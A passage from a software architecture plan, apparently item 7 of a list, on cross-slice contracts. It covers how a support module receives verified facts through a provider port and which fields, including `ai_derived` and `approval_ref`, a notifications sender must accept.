7. **Cross-slice contracts.** docs/03 section 3.1 lets `support` import neither `payments` nor `meters`, so verified facts come through a `VerifiedFactsProvider` port (empty default, composition-root adapter, **[open]** until slices 4 and 6 exist). The notifications sender must resolve `ticket_reply` through `ReplyBodyProvider` and accept `ai_derived` and `approval_ref` (the outbox CHECK needs the latter); if slice 7 lacks them an additive change is needed there.
